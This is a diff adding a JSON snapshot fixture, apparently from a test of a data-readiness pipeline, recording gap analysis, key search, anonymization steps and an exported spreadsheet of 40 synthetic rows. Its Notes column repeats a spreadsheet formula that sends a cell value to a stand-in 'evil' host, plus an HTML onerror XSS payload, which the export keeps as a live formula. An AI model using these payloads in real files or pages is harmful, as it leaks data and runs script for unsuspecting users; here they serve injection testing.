@@ -1,0 +1,831 @@
+{
+ "analyze_stages": [
+  "columns",
+  "done",
+  "finalizing",
+  "loading",
+  "overview"
+ ],
+ "confirm": {
+  "message": "Key selection saved",
+  "selected_key": [
+   "ID"
+  ],
+  "success": true
+ },
+ "execute_final": {
+  "message": "Pipeline execution complete",
+  "percentage": 100,
+  "stage": "done",
+  "transformation_log": [
+   {
+    "columns": [
+     "Name"
+    ],
+    "rows_affected": 40,
+    "type": "anonymization"
+   },
+   {
+    "columns": [
+     "EuroNum"
+    ],
+    "note": "Type hints recorded for reference",
+    "type": "normalization"
+   }
+  ]
+ },
+ "execute_output": {
+  "data_readiness_report_<TS>_data.xlsx": {
+   "Sheet1": [
+    [
+     "s:'ID'",
+     "s:'Zip'",
+     "s:'Account'",
+     "s:'BigId'",
+     "s:'Amount'",
+     "s:'Region'",
+     "s:'Date'",
+     "s:'DateText'",
+     "s:'EuroNum'",
+     "s:'Pct'",
+     "s:'Name'",
+     "s:'Email'",
+     "s:'Notes'"
+    ],
+    [
+     "s:'PR-00001'",
+     "n:1000",
+     "n:1000",
+     "n:9007199254740992",
+     "n:-300",
+     "s:'N'",
+     "s:'2024-01-01'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00001'",
+     "s:'alice0@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00002'",
+     "n:1007",
+     "n:1001",
+     "n:9007199254740994",
+     "n:-262.5",
+     "s:'S'",
+     "s:'2024-01-02'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00002'",
+     "inlineStr:None",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00003'",
+     "n:1014",
+     "n:1002",
+     "n:9007199254740996",
+     "n:-225",
+     "inlineStr:None",
+     "s:'2024-01-03'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00003'",
+     "s:'carol2@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00004'",
+     "n:1021",
+     "n:1003",
+     "n:9007199254740996",
+     "n:-187.5",
+     "s:'N'",
+     "s:'2024-01-04'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00004'",
+     "s:'dave3@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00005'",
+     "n:1028",
+     "inlineStr:None",
+     "n:9007199254740996",
+     "n:-150",
+     "s:'S'",
+     "s:'2024-01-05'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00001'",
+     "s:'alice4@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00006'",
+     "n:1035",
+     "n:1005",
+     "n:9007199254740998",
+     "n:-112.5",
+     "inlineStr:None",
+     "s:'2024-01-06'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00002'",
+     "s:'bob5@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00007'",
+     "n:1042",
+     "n:1006",
+     "n:9007199254741000",
+     "n:-75",
+     "s:'N'",
+     "s:'2024-01-07'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00003'",
+     "s:'carol6@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00007'",
+     "n:1042",
+     "n:1006",
+     "n:9007199254741000",
+     "n:-75",
+     "s:'N'",
+     "s:'2024-01-07'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00003'",
+     "s:'carol6@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00009'",
+     "n:1056",
+     "n:1008",
+     "n:9007199254741000",
+     "n:0",
+     "inlineStr:None",
+     "s:'2024-01-09'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00001'",
+     "s:'alice8@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00010'",
+     "n:1063",
+     "n:1009",
+     "n:9007199254741002",
+     "n:37.5",
+     "s:'N'",
+     "s:'2024-01-10'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00002'",
+     "s:'bob9@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00011'",
+     "n:1070",
+     "n:1010",
+     "n:9007199254741004",
+     "inlineStr:None",
+     "s:'S'",
+     "s:'2024-01-11'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00003'",
+     "s:'carol10@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00012'",
+     "n:1077",
+     "n:1011",
+     "n:9007199254741004",
+     "n:112.5",
+     "inlineStr:None",
+     "s:'2024-01-12'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00004'",
+     "s:'dave11@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00013'",
+     "n:1084",
+     "n:1012",
+     "n:9007199254741004",
+     "n:150",
+     "s:'N'",
+     "s:'2024-01-13'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00001'",
+     "s:'alice12@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00014'",
+     "n:1091",
+     "n:1013",
+     "n:9007199254741006",
+     "n:187.5",
+     "s:'S'",
+     "s:'2024-01-14'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00002'",
+     "s:'bob13@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00015'",
+     "n:1098",
+     "n:1014",
+     "n:9007199254741008",
+     "n:225",
+     "inlineStr:None",
+     "s:'2024-01-15'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00003'",
+     "s:'carol14@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00016'",
+     "n:1105",
+     "n:1015",
+     "n:9007199254741008",
+     "n:262.5",
+     "s:'N'",
+     "s:'2024-01-16'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00004'",
+     "s:'dave15@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00017'",
+     "n:1112",
+     "n:1016",
+     "n:9007199254741008",
+     "n:300",
+     "s:'S'",
+     "s:'2024-01-17'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00001'",
+     "s:'alice16@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00018'",
+     "n:1119",
+     "n:1017",
+     "n:9007199254741010",
+     "n:337.5",
+     "inlineStr:None",
+     "s:'2024-01-18'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00002'",
+     "s:'bob17@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00019'",
+     "n:1126",
+     "n:1018",
+     "n:9007199254741012",
+     "n:375",
+     "s:'N'",
+     "s:'2024-01-19'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00003'",
+     "s:'carol18@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00020'",
+     "n:1133",
+     "n:1019",
+     "n:9007199254741012",
+     "n:412.5",
+     "s:'S'",
+     "s:'2024-01-20'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00004'",
+     "s:'dave19@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00021'",
+     "n:1140",
+     "n:1020",
+     "n:9007199254741012",
+     "n:450",
+     "inlineStr:None",
+     "s:'2024-01-21'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00001'",
+     "s:'alice20@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00022'",
+     "n:1147",
+     "n:1021",
+     "n:9007199254741014",
+     "n:487.5",
+     "s:'N'",
+     "s:'2024-01-22'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00002'",
+     "s:'bob21@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00023'",
+     "n:1154",
+     "n:1022",
+     "n:9007199254741016",
+     "n:525",
+     "s:'S'",
+     "s:'2024-01-23'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00003'",
+     "s:'carol22@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00024'",
+     "n:1161",
+     "n:1023",
+     "n:9007199254741016",
+     "n:562.5",
+     "inlineStr:None",
+     "s:'2024-01-24'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00004'",
+     "s:'dave23@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00025'",
+     "n:1168",
+     "n:1024",
+     "n:9007199254741016",
+     "n:600",
+     "s:'N'",
+     "s:'2024-01-25'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00001'",
+     "s:'alice24@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00026'",
+     "n:1175",
+     "n:1025",
+     "n:9007199254741018",
+     "n:637.5",
+     "s:'S'",
+     "s:'2024-01-26'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00002'",
+     "s:'bob25@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00027'",
+     "n:1182",
+     "n:1026",
+     "n:9007199254741020",
+     "n:675",
+     "inlineStr:None",
+     "s:'2024-01-27'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00003'",
+     "s:'carol26@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00028'",
+     "n:1189",
+     "n:1027",
+     "n:9007199254741020",
+     "n:712.5",
+     "s:'N'",
+     "s:'2024-01-28'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00004'",
+     "s:'dave27@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00029'",
+     "n:1196",
+     "n:1028",
+     "n:9007199254741020",
+     "n:750",
+     "s:'S'",
+     "s:'2024-01-29'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00001'",
+     "s:'alice28@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00030'",
+     "n:1203",
+     "n:1029",
+     "n:9007199254741022",
+     "n:787.5",
+     "inlineStr:None",
+     "s:'2024-01-30'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00002'",
+     "s:'bob29@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00031'",
+     "n:1210",
+     "n:1030",
+     "n:9007199254741024",
+     "n:825",
+     "s:'N'",
+     "s:'2024-01-31'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00003'",
+     "s:'carol30@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00032'",
+     "n:1217",
+     "n:1031",
+     "n:9007199254741024",
+     "n:862.5",
+     "s:'S'",
+     "s:'2024-02-01'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00004'",
+     "s:'dave31@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00033'",
+     "n:1224",
+     "n:1032",
+     "n:9007199254741024",
+     "n:900",
+     "inlineStr:None",
+     "s:'2024-02-02'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00001'",
+     "s:'alice32@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00034'",
+     "n:1231",
+     "n:1033",
+     "n:9007199254741026",
+     "n:937.5",
+     "s:'N'",
+     "s:'2024-02-03'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00002'",
+     "s:'bob33@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00035'",
+     "n:1238",
+     "n:1034",
+     "n:9007199254741028",
+     "n:975",
+     "s:'S'",
+     "s:'2024-02-04'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00003'",
+     "s:'carol34@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00036'",
+     "n:1245",
+     "n:1035",
+     "n:9007199254741028",
+     "n:1012.5",
+     "inlineStr:None",
+     "s:'2024-02-05'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00004'",
+     "s:'dave35@example.com'",
+     "s:'café'"
+    ],
+    [
+     "s:'PR-00037'",
+     "n:1252",
+     "n:1036",
+     "n:9007199254741028",
+     "n:1050",
+     "s:'N'",
+     "s:'2024-02-06'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00001'",
+     "s:'alice36@example.com'",
+     "f:'=HYPERLINK(\"http://evil/?\"&A2,\"x\")'"
+    ],
+    [
+     "s:'PR-00038'",
+     "n:1259",
+     "n:1037",
+     "n:9007199254741030",
+     "n:1087.5",
+     "s:'S'",
+     "s:'2024-02-07'",
+     "s:'2024-03-05'",
+     "s:'1.234,56'",
+     "s:'0.5'",
+     "s:'NAM_00002'",
+     "s:'bob37@example.com'",
+     "s:'x|||y'"
+    ],
+    [
+     "s:'PR-00039'",
+     "n:1266",
+     "n:1038",
+     "n:9007199254741032",
+     "n:1125",
+     "inlineStr:None",
+     "s:'2024-02-08'",
+     "s:'13/02/2024'",
+     "s:'10'",
+     "s:'12.5%'",
+     "s:'NAM_00003'",
+     "s:'carol38@example.com'",
+     "s:'<img src=x onerror=alert(1)>'"
+    ],
+    [
+     "s:'PR-00040'",
+     "n:1273",
+     "n:1039",
+     "n:9007199254741032",
+     "n:1162.5",
+     "s:'N'",
+     "s:'2024-02-09'",
+     "s:'01/02/2024'",
+     "s:'2,5'",
+     "s:'50%'",
+     "s:'NAM_00004'",
+     "s:'dave39@example.com'",
+     "s:'café'"
+    ]
+   ]
+  },
+  "data_readiness_report_<TS>_report.pdf": {
+   "binary_bytes_present": true
+  }
+ },
+ "gaps": {
+  "columns_with_gaps": 4,
+  "current_triage": {},
+  "gap_summary": [
+   {
+    "column": "Region",
+    "detected_type": "Text",
+    "null_count": 13,
+    "null_percentage": 32.5,
+    "unique_count": 2
+   },
+   {
+    "column": "Account",
+    "detected_type": "Float",
+    "null_count": 1,
+    "null_percentage": 2.5,
+    "unique_count": 38
+   },
+   {
+    "column": "Amount",
+    "detected_type": "Float",
+    "null_count": 1,
+    "null_percentage": 2.5,
+    "unique_count": 38
+   },
+   {
+    "column": "Email",
+    "detected_type": "Email",
+    "null_count": 1,
+    "null_percentage": 2.5,
+    "unique_count": 38
+   }
+  ],
+  "success": true,
+  "total_columns": 13
+ },
+ "gaps_status": 200,
+ "keys_final": {
+  "current": 0,
+  "message": "Search complete. Found 3 minimal key(s).",
+  "percentage": 92,
+  "stage": "complete",
+  "total": 0
+ },
+ "keys_stages": [
+  "complete",
+  "done",
+  "filtering",
+  "level1",
+  "level2",
+  "level3",
+  "level4",
+  "loading"
+ ],
+ "select": {
+  "message": "Transformation selections saved",
+  "selections": {
+   "anonymization": {
+    "columns": [
+     "Name"
+    ],
+    "enabled": true
+   },
+   "normalization": {
+    "columns": [
+     "EuroNum"
+    ],
+    "enabled": true
+   }
+  },
+  "success": true
+ },
+ "start": {
+  "column_names": [
+   "ID",
+   "Zip",
+   "Account",
+   "BigId",
+   "Amount",
+   "Region",
+   "Date",
+   "DateText",
+   "EuroNum",
+   "Pct",
+   "Name",
+   "Email",
+   "Notes"
+  ],
+  "columns": 13,
+  "rows": 40,
+  "success": true
+ },
+ "state_after_analyze": {
+  "stage_data": {
+   "1": true,
+   "2": false,
+   "3": false,
+   "4": false,
+   "5": false
+  },
+  "state": {
+   "col_count": 13,
+   "current_stage": 2,
+   "row_count": 40,
+   "stages_completed": [
+    1
+   ]
+  },
+  "success": true,
+  "user_decisions": {
+   "2": {},
+   "3": {},
+   "4": {}
+  }
+ },
+ "transformations": {
+  "current_selections": {},
+  "recommendations": [
+   {
+    "column_details": [
+     {
+      "column": "Account",
+      "explanation": "Contains account numbers - will be replaced with fake numbers",
+      "pattern": "account",
+      "unique_values": 38
+     },
+     {
+      "column": "Name",
+      "explanation": "Contains personal names - will be replaced with realistic fake names",
+      "pattern": "name",
+      "unique_values": 4
+     },
+     {
+      "column": "Email",
+      "explanation": "Contains email addresses - will be replaced with anonymized emails",
+      "pattern": "email",
+      "unique_values": 38
+     }
+    ],
+    "columns": [
+     "Account",
+     "Name",
+     "Email"
+    ],
+    "description": "Protect personally identifiable information (PII) by replacing sensitive data with realistic fake values while maintaining data structure and relationships.",
+    "priority": "high",
+    "title": "Data Anonymization",
+    "type": "anonymization"
+   },
+   {
+    "column_details": [
+     {
+      "column": "Date",
+      "current": "object",
+      "detected": "Date",
+      "explanation": "Stored as text but contains dates - will convert to proper date format for sorting/filtering"
+     }
+    ],
+    "columns": [
+     "Date"
+    ],
+    "description": "Convert columns to their proper data types. This improves data quality, enables proper sorting, and allows mathematical operations.",
+    "priority": "medium",
+    "title": "Data Type Normalization",
+    "type": "normalization"
+   }
+  ],
+  "success": true
+ },
+ "transformations_status": 200
+}
